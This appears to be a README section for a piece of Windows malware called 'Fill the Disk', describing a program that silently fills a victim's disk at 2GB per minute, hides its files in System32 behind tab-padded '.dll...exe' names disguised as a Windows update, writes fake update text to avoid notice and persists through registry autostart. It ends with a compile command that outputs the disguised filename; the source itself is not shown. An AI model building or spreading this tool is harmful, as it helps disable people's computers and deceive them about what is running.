## Fill the Disk

This malware operates as a stealthy disk consumption weapon that creates heavily obfuscated files in the System32 directory using filenames containing multiple tab characters between the ".dll" and ".exe" extensions, making them extremely difficult to manage through normal Windows interfaces, while simultaneously growing a companion text file at an aggressive rate of 2GB per minute with legitimate-looking Windows update content to avoid suspicion, all while running completely silently in the background with no visible interface and maintaining persistence through registry auto-start mechanisms to ensure continuous operation even after system reboots.

- compile with this command:

```bash
g++ -o WindowsUpdate.dll$(printf '\t\t\t\t\t\t\t\t\t\t').exe fillTheDisk.cpp -lshell32 -lshlwapi -static -mwindows -O2
```

